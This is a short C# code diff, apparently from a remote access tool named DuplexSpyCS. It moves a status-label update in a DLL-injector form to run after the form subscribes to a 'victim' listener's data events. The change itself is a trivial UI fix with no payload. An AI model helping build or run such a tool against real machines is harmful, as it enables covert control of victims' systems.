@@ -54,7 +54,6 @@ namespace DuplexSpyCS
 
         private void fnSetup()
         {
-            toolStripStatusLabel1.Text = $"Process[{listView1.Items.Count}]";
             comboBox1.SelectedIndex = 2;
 
             foreach (var p in m_lsProc)
@@ -66,6 +65,8 @@ namespace DuplexSpyCS
             }
 
             m_victim.m_listener.ReceivedDecoded += fnRecv;
+
+            toolStripStatusLabel1.Text = $"Process[{listView1.Items.Count}]";
         }
 
         private void frmTaskDLLInjector_Load(object sender, EventArgs e)
